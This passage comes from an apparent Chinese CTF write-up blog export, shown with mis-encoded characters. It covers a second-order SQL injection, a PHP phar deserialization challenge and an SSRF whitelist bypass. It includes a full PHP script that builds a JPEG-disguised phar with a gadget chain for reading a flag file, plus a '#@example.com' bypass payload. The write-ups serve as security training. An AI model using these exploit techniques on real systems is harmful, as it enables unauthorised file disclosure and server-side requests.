æœ€åè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œedit.phpé‡Œæˆ‘ä»¬çš„titleå’Œcontentæ˜¯ç»è¿‡addslashes()å¤„ç†çš„ï¼Œæ€ä¹ˆç»•ï¼Ÿæ³¨æ„ï¼Œæˆ‘ä»¬çš„$row['title']æ˜¯é€šè¿‡SQLæŸ¥è¯¢æ¥çš„ï¼Œæˆ‘ä»¬é€šè¿‡addslashes()å¤„ç†åä¼šåœ¨'ååŠ \\ï¼Œä½†æ˜¯å†™å…¥æ•°æ®åº“çš„æ—¶å€™ï¼Œè½¬ä¹‰åˆè¢«å†™å›å»äº†ï¼Œå†æ¬¡æŸ¥è¯¢çš„æ—¶å€™è¿˜æ˜¯1'ï¼Œaddslashes()å½¢åŒè™šè®¾ã€‚ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¼€å§‹å†™è„šæœ¬äº†ã€‚ï¼ˆæˆ‘ä¸æ˜¯å¾ˆå–œæ¬¢åœ¨ç›²æ³¨é‡Œç”¨äºŒåˆ†æ³•ï¼Œä¸ºä»€ä¹ˆä¸å¤šç»™æœåŠ¡å™¨æ·»ç‚¹æµé‡å‘¢ï¼Ÿ ~(â‰§â–½â‰¦)/~ï¼‰ 123 flag{55686b5f-27d2-41f6-87c4-7decc588cf7f}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"äºŒæ¬¡æ³¨å…¥","slug":"äºŒæ¬¡æ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"},{"name":"å¼‚æˆ–æ³¨å…¥","slug":"å¼‚æˆ–æ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/"},{"name":"ç›²æ³¨","slug":"ç›²æ³¨","permalink":"http://tiaonmmn.github.io/tags/%E7%9B%B2%E6%B3%A8/"}]},{"title":"BUUOJåˆ·é¢˜-Web-SimplePHP","slug":"BUUOJåˆ·é¢˜-Web-SimplePHP","date":"2019-10-28T13:57:08.000Z","updated":"2020-03-05T07:15:52.575Z","comments":true,"path":"2019/10/28/BUUOJåˆ·é¢˜-Web-SimplePHP/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/28/BUUOJ%E5%88%B7%E9%A2%98-Web-SimplePHP/","excerpt":"SWPU 2018 CTFçš„SimplePHPã€‚ ç»™äº†ä¸ªæŸ¥çœ‹æ–‡ä»¶å’Œä¸Šä¼ æ–‡ä»¶ï¼Œæ‰«ç›®å½•ä¼¼ä¹æ²¡ç»“æœã€‚ç„¶åå‘ç°â€œæŸ¥çœ‹æ–‡ä»¶â€çš„URLæœ‰ç‚¹ä¸œè¥¿http://ed97c7d0-1d36-4255-852f-e4b73a9fbd2b.node3.buuoj.cn/file.php?file=ï¼ŒLFIè¯•ä¸€ä¸‹ã€‚è¡Œå§ï¼Œç›´æ¥show_sourceäº†ã€‚","text":"SWPU 2018 CTFçš„SimplePHPã€‚ ç»™äº†ä¸ªæŸ¥çœ‹æ–‡ä»¶å’Œä¸Šä¼ æ–‡ä»¶ï¼Œæ‰«ç›®å½•ä¼¼ä¹æ²¡ç»“æœã€‚ç„¶åå‘ç°â€œæŸ¥çœ‹æ–‡ä»¶â€çš„URLæœ‰ç‚¹ä¸œè¥¿http://ed97c7d0-1d36-4255-852f-e4b73a9fbd2b.node3.buuoj.cn/file.php?file=ï¼ŒLFIè¯•ä¸€ä¸‹ã€‚è¡Œå§ï¼Œç›´æ¥show_sourceäº†ã€‚ index.php1234&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include &#x27;base.php&#x27;;?&gt; file.php1234567891011121314151617&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include &#x27;function.php&#x27;; include &#x27;class.php&#x27;; ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#x27;file doesn\\&#x27;t exists.&#x27;); &#125; ?&gt; upload_file.php1234567891011121314151617181920212223242526&lt;?php include &#x27;function.php&#x27;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest=&quot;utf-8&quot;&gt; &lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align = &quot;center&quot;&gt; &lt;h1&gt;å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!&lt;/h1&gt; &lt;/div&gt; &lt;style&gt; p&#123; margin:0 auto&#125; &lt;/style&gt; &lt;div&gt; &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶å:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt; &lt;/div&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; function.php12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) &#123; //echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; return false; &#125; &#125; &#125; ?&gt; base.php123456789101112131415161718192021222324252627282930&lt;?php session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;web3&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container-fluid&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;é¦–é¡µ&lt;/a&gt; &lt;/div&gt; &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;æŸ¥çœ‹æ–‡ä»¶&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--flag is in f1ag.php--&gt; class.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker!&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; OKï¼Œflagåœ¨f1ag.phpä¸­ï¼Œä¹Ÿè¯»ä¸å‡ºæ¥å†…å®¹ï¼ˆåºŸè¯ï¼‰ã€‚çœ‹æºç å§ï¼Œæˆ‘æ¯”è¾ƒæ„Ÿå…´è¶£file.phpï¼Œå…ˆä»é‚£é‡Œçœ‹èµ·ã€‚open_basediré™åˆ¶åœ¨/var/www/htmlä¸‹ï¼Œç„¶ånew Show()ï¼Œè¿™ä¸ªShowæ¥è‡ªclass.phpã€‚_showæ–¹æ³•è¦æ±‚ä¼ çš„fileå‚æ•°ä¸èƒ½å‡ºç°httpã€httpsã€file:ã€gopherã€dictã€..ã€f1agï¼Œç„¶åhighlight_fileï¼Œå¹¶ä¸”è¿˜æœ‰ä¸€ä¸ª__wakeupæ–¹æ³•ï¼ŒåŒæ ·çš„é™åˆ¶ã€‚æš‚æ—¶æ²¡åˆ«çš„çœ‹ç‚¹ï¼Œå›è¿‡å¤´çœ‹ä¸Šä¼ ã€‚é™åˆ¶æ‰©å±•åä¸ºgifã€jpegã€jpgã€pngï¼Œç¬¦åˆæ¡ä»¶ï¼Œå°±ä¼šé‡å‘½åæ–‡ä»¶ï¼Œæ”¾åˆ°uploadç›®å½•ä¸‹ã€‚ä¼¼ä¹ä¹Ÿæ²¡ä»€ä¹ˆåˆ©ç”¨ç‚¹ã€‚ é‚£è¿˜æ˜¯å›è¿‡å¤´æ¥ç»§ç»­ç¿»class.phpå§ã€‚Testç±»ç¨å¾®æœ‰ç‚¹ä¸œè¥¿ï¼Œè‡ªå®šä¹‰äº†__geté­”æœ¯æ–¹æ³•ï¼Œè¿”å›file_getå‡½æ•°çš„è¿”å›å€¼ï¼Œè€Œfile_get()ç”¨åˆ°äº†file_get_contents()ï¼Œç”±äºPharè€ƒçš„æœ‰ç‚¹å¤šï¼Œè‡ªç„¶è€Œç„¶å°±ä¼šå‘é‚£æ–¹é¢å»æƒ³ï¼ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶ï¼Œæ€è·¯çœ‹èµ·æ¥æ²¡é”™ã€‚ å…³äºPharååºåˆ—åŒ–çš„é—®é¢˜ï¼Œé‡ç‚¹å‚è€ƒè¿™é‡Œã€‚æˆ‘ä»¬ç›®å‰éœ€è¦èƒ½å¤Ÿè§¦å‘ååºåˆ—åŒ–çš„ç‚¹ï¼Œç„¶åå°±åœ¨file.phpé‡Œæ‰¾åˆ°äº†ï¼Œç¬¬11è¡Œçš„file_existsï¼Œè¿™ä¸ªèƒ½å¤Ÿè§¦å‘Pharã€‚ ä¸‹é¢æ„é€ ååºåˆ—åŒ–é“¾ã€‚é¦–å…ˆè‚¯å®šï¼ŒShowè¿™ä¸ªç±»æ˜¯æ ¸å¿ƒï¼Œè¦ç”¨å®ƒç©¿èµ·æ¥C1e4rå’ŒTestç±»ï¼Œæ€ä¹ˆç©¿ï¼ŸShowç±»è‡ªå®šä¹‰äº†ä¸€ä¸ª__toString()æ–¹æ³•ï¼Œå…¶ä¸­çš„\\(contentå¾ˆæœ‰æ„æ€ã€‚`\\)content = \\(this-&gt;str[&#39;str&#39;]-&gt;source;`ï¼Œæˆ‘ä»¬éœ€è¦è®©\\)this-&gt;str['str']æˆä¸ºæŸä¸ªç±»ï¼Œè”æƒ³åˆ°Testç±»åˆè‡ªå®šä¹‰äº†__getæ–¹æ³•ï¼Œå¦‚æœ\\(this-&gt;str[&#39;str&#39;]æ˜¯Testç±»ä¼šæ€æ ·ï¼Ÿæˆ‘ä»¬å°†Testç±»ä¸­çš„\\)params[source]è®¾ç½®æˆf1ag.phpï¼Œè€Œsourceå˜é‡å¹¶ä¸å­˜åœ¨Testç±»ä¸­ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›file_get(f1ag.php)==base64_encode(file_get_conents('f1ag.php'))ã€‚çœ‹èµ·æ¥å¾ˆå¯è¡Œã€‚ è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼ŒShowç±»çš„__toString()å¦‚ä½•è§¦å‘ï¼Ÿæˆ‘ä»¬éœ€è¦ä¸€ä¸ªèƒ½å¤Ÿechoå­—ç¬¦ä¸²çš„ç‚¹ï¼Œå°±åœ¨C1e4rçš„__destruct()é‡Œæœ‰ä¸ªecho $this-&gt;test;ã€‚è²Œä¼¼æ²¡ä»€ä¹ˆé—®é¢˜äº†ï¼Œæ€»ç»“ä¸€ä¸‹æˆ‘ä»¬çš„æ”»å‡»æµç¨‹ï¼š A[&quot;C1e4rç±»è§¦å‘Showç±»çš„\\_\\_toString()&quot;] --&gt; B B[&quot;Showç±»è§¦å‘Testç±»çš„\\_\\_get()&quot;] --&gt; C C[&quot;Testç±»é¢„å…ˆè®¾ç½®å¥½å€¼ï¼Œ\\_\\_get(source)çš„æ—¶å€™ä¼šfile_get_contents()ï¼Œå¾—åˆ°flag&quot;] OKï¼Œå†™ä»£ç å§ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpclass C1e4r&#123; public $test; public $str;&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $file; public $params = array(&#x27;source&#x27; =&gt; &quot;/var/www/html/f1ag.php&quot;);&#125;?&gt;&lt;?php$jpeg_header_size = &quot;\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46\\x49\\x46\\x00\\x01\\x01\\x01\\x00\\x48\\x00\\x48\\x00\\x00\\xff\\xfe\\x00\\x13&quot; . &quot;\\x43\\x72\\x65\\x61\\x74\\x65\\x64\\x20\\x77\\x69\\x74\\x68\\x20\\x47\\x49\\x4d\\x50\\xff\\xdb\\x00\\x43\\x00\\x03\\x02&quot; . &quot;\\x02\\x03\\x02\\x02\\x03\\x03\\x03\\x03\\x04\\x03\\x03\\x04\\x05\\x08\\x05\\x05\\x04\\x04\\x05\\x0a\\x07\\x07\\x06\\x08\\x0c\\x0a\\x0c\\x0c\\x0b\\x0a\\x0b\\x0b\\x0d\\x0e\\x12\\x10\\x0d\\x0e\\x11\\x0e\\x0b\\x0b\\x10\\x16\\x10\\x11\\x13\\x14\\x15\\x15&quot; . &quot;\\x15\\x0c\\x0f\\x17\\x18\\x16\\x14\\x18\\x12\\x14\\x15\\x14\\xff\\xdb\\x00\\x43\\x01\\x03\\x04\\x04\\x05\\x04\\x05\\x09\\x05\\x05\\x09\\x14\\x0d\\x0b\\x0d\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14&quot; . &quot;\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\x14\\xff\\xc2\\x00\\x11\\x08\\x00\\x0a\\x00\\x0a\\x03\\x01\\x11\\x00\\x02\\x11\\x01\\x03\\x11\\x01&quot; . &quot;\\xff\\xc4\\x00\\x15\\x00\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\xff\\xc4\\x00\\x14\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xda\\x00\\x0c\\x03&quot; . &quot;\\x01\\x00\\x02\\x10\\x03\\x10\\x00\\x00\\x01\\x95\\x00\\x07\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x05\\x02\\x1f\\xff\\xc4\\x00\\x14\\x11&quot; . &quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20&quot; . &quot;\\xff\\xda\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x01\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x06\\x3f\\x02\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01&quot; . &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x21\\x1f\\xff\\xda\\x00\\x0c\\x03\\x01\\x00\\x02\\x00\\x03\\x00\\x00\\x00\\x10\\x92\\x4f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00&quot; . &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x03\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda&quot; . &quot;\\x00\\x08\\x01\\x02\\x01\\x01\\x3f\\x10\\x1f\\xff\\xc4\\x00\\x14\\x10\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xff\\xda\\x00\\x08\\x01\\x01\\x00\\x01\\x3f\\x10\\x1f\\xff\\xd9&quot;;$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;setStub($jpeg_header_size . &quot; __HALT_COMPILER(); ?&gt;&quot;);$test_show = new Show(&#x27;index.php&#x27;);$test_test = new Test();$test_c14er = new C1e4r($test_show);$test_show-&gt;str = array(&quot;str&quot; =&gt; $test_test);$test_c14er-&gt;str = $test_show;$phar-&gt;setMetadata($test_c14er);var_dump($phar-&gt;getMetadata());$phar-&gt;stopBuffering();?&gt; ä¸€å®šè¦æŠŠæºæ–‡ä»¶ä¸­ä¹±ä¸ƒå…«ç³Ÿçš„é­”æœ¯æ–¹æ³•éƒ½åˆ æ‰ï¼Œå¦åˆ™ä¼šå½±å“Pharæ–‡ä»¶ç”Ÿæˆã€‚ ç„¶åä¸Šä¼ ï¼Œç®—å‡ºæ–‡ä»¶åï¼Œfile.phpé‚£é‡Œç”¨phar://åè®®å»è¯»jpgæ–‡ä»¶å°±OKäº†ï¼Œä¼šè¿”å›Base64ï¼Œè§£å¯†å°±æ˜¯Flagã€‚ flag{5a74c4b5-eb9c-44fc-a65f-91e37e1cf8bd}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Phar","slug":"Phar","permalink":"http://tiaonmmn.github.io/tags/Phar/"}]},{"title":"USTC-Hackergame-2019-ç½‘é¡µè¯»å–å™¨","slug":"USTC-Hackergame-2019-ç½‘é¡µè¯»å–å™¨","date":"2019-10-26T13:51:10.000Z","updated":"2019-12-10T12:15:12.677Z","comments":true,"path":"2019/10/26/USTC-Hackergame-2019-ç½‘é¡µè¯»å–å™¨/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/26/USTC-Hackergame-2019-%E7%BD%91%E9%A1%B5%E8%AF%BB%E5%8F%96%E5%99%A8/","excerpt":"å¾ˆæ˜æ˜¾çš„ï¼Œåœ¨è€ƒå¯ŸSSRFï¼Œç„¶åæœ‰æºç ï¼š","text":"å¾ˆæ˜æ˜¾çš„ï¼Œåœ¨è€ƒå¯ŸSSRFï¼Œç„¶åæœ‰æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from flask import Flask, render_template, request, send_from_directoryimport requests # well, requests is designed for humans, and I like it.app = Flask(__name__)whitelist_hostname = [&quot;example.com&quot;, &quot;www.example.com&quot;]whitelist_scheme = [&quot;http://&quot;]def check_hostname(url): for i in whitelist_scheme: if url.startswith(i): url = url[len(i):] # strip scheme url = url[url.find(&quot;@&quot;) + 1:] # strip userinfo if not url.find(&quot;/&quot;) == -1: url = url[:url.find(&quot;/&quot;)] # strip parts after authority if not url.find(&quot;:&quot;) == -1: url = url[:url.find(&quot;:&quot;)] # strip port if url not in whitelist_hostname: return (False, &quot;hostname &#123;&#125; not in whitelist&quot;.format(url)) return (True, &quot;ok&quot;) return (False, &quot;scheme not in whitelist, only &#123;&#125; allowed&quot;.format(whitelist_scheme))@app.route(&quot;/&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/request&quot;)def req_route(): url = request.args.get(&#x27;url&#x27;) status, msg = check_hostname(url) if status is False: # print(msg) return msg try: r = requests.get(url, timeout=2) if not r.status_code == 200: return &quot;We tried accessing your url, but it does not return HTTP 200. Instead, it returns &#123;&#125;.&quot;.format(r.status_code) return r.text except requests.Timeout: return &quot;We tried our best, but it just timeout.&quot; except requests.RequestException: return &quot;While accessing your url, an exception occurred. There may be a problem with your url.&quot;@app.route(&quot;/source&quot;)def get_source(): # return &quot;While accessing your url, an exception occurred. There may be a problem with your url.&quot; return send_from_directory(&quot;static/&quot;, &quot;app.py&quot;, as_attachment=True)if __name__ == &#x27;__main__&#x27;: app.run(&quot;0.0.0.0&quot;, 8000, debug=False) æˆ‘ä»¬æäº¤urlï¼Œè¿‡check_hostname()æ£€æµ‹åå°±ä¼šç”¨requests.get()å¾—åˆ°response.textã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹check_hostname()ã€‚å®ƒæ²¡æœ‰ä½¿ç”¨urllibï¼Œè€Œæ˜¯è‡ªå·±å†™äº†ä¸€å¥—é€»è¾‘ï¼Œå¤§æ¦‚ç‡å°±æ˜¯è¿™é‡Œæœ‰é—®é¢˜äº†ã€‚ é¦–å…ˆå»æ‰äº†\"http://\"ï¼Œç„¶åå»æ‰äº†\"@\"ä¹‹å‰çš„æ‰€æœ‰ä¸œè¥¿ï¼Œå»æ‰äº†ç¬¬ä¸€ä¸ª\"/\"ä¹‹åçš„æ‰€æœ‰ä¸œè¥¿ï¼Œè¿˜å»æ‰äº†ç¬¬ä¸€ä¸ª\":\"ä¹‹åçš„æ‰€æœ‰ä¸œè¥¿ï¼Œæœ€åå‰©ä½™äº†ç†æ‰€å½“ç„¶å°±æ˜¯ä¸»æœºåäº†ã€‚å¦‚æœä¸åœ¨whitelist_hostnameé‡Œå°±return Falseã€‚ çœ‹èµ·æ¥æ²¡ä»€ä¹ˆé—®é¢˜ã€‚è¿™é¢˜çš„è€ƒç‚¹åœ¨äºURLç»„æˆéƒ¨åˆ†é‡Œå¯ä»¥æœ‰å…¶ä»–çš„ä¸œè¥¿ï¼Œæ¥æºä¸ğŸŠåœ¨Blackhatä¸Šçš„æ¼”è®²ï¼š å¦‚æœæˆ‘ä»¬åœ¨URLä¸­åŠ å…¥#æˆ–è€…?ï¼Œå®ƒä»¬åé¢çš„å†…å®¹é»˜è®¤æ˜¯å…¨éƒ¨ä¸¢å¼ƒçš„ã€‚å¯å‚è€ƒå¦‚ä¸‹ï¼š å› æ­¤æˆ‘ä»¬æ„é€ Payloadä¸ºï¼šhttp://web1/flag#@example.comï¼Œrequests.get()åœ¨å¤„ç†å¸¦#çš„URLï¼Œä¼šå°†#åé¢çš„æ‰€æœ‰å†…å®¹ä¸¢å¼ƒï¼Œä½†æ˜¯check_hostname()æ²¡æœ‰æ£€æŸ¥#ï¼Œæˆ‘ä»¬ç”¨@æ©ç›–ä¹‹å‰çš„æ‰€æœ‰å†…å®¹ï¼Œå¹¶åŠ å…¥example.comé€šè¿‡æ£€æŸ¥ã€‚æŠŠ#æ¢æˆ?ä¹Ÿå¯ä»¥ã€‚ flag{dda3fd30-7ad6-4b70-926d-02ee8bc81ca6}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"}]},{"title":"BUUOJåˆ·é¢˜-Web-Checkin","slug":"BUUOJåˆ·é¢˜-Web-Checkin","date":"2019-10-24T12:06:12.000Z","updated":"2019-12-10T12:15:12.595Z","comments":true,"path":"2019/10/24/BUUOJåˆ·é¢˜-Web-Checkin/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/24/BUUOJ%E5%88%B7%E9%A2%98-Web-Checkin/","excerpt":"SUCTF 2019çš„Checkinã€‚ æ‰“å¼€åè®©æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ã€‚åªå…è®¸å›¾ç‰‡æ ¼å¼çš„æ‰©å±•åï¼Œä¸”ä¸èƒ½åœ¨æ–‡ä»¶å†…å‡ºç°&lt;?ã€‚å¦‚æœæˆ‘ä»¬å¼ºè¡Œä¿®æ”¹æ‰©å±•åï¼Œä¼šæç¤ºexif_imagetype:not image!ï¼Œè€ŒæˆåŠŸä¸Šä¼ åè¿”å›äº†ä¸€äº›ä¸œè¥¿ã€‚","text":"SUCTF 2019çš„Checkinã€‚ æ‰“å¼€åè®©æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ã€‚åªå…è®¸å›¾ç‰‡æ ¼å¼çš„æ‰©å±•åï¼Œä¸”ä¸èƒ½åœ¨æ–‡ä»¶å†…å‡ºç°&lt;?ã€‚å¦‚æœæˆ‘ä»¬å¼ºè¡Œä¿®æ”¹æ‰©å±•åï¼Œä¼šæç¤ºexif_imagetype:not image!ï¼Œè€ŒæˆåŠŸä¸Šä¼ åè¿”å›äº†ä¸€äº›ä¸œè¥¿ã€‚ å¯¹äº&lt;?çš„æ£€æµ‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨&lt;script 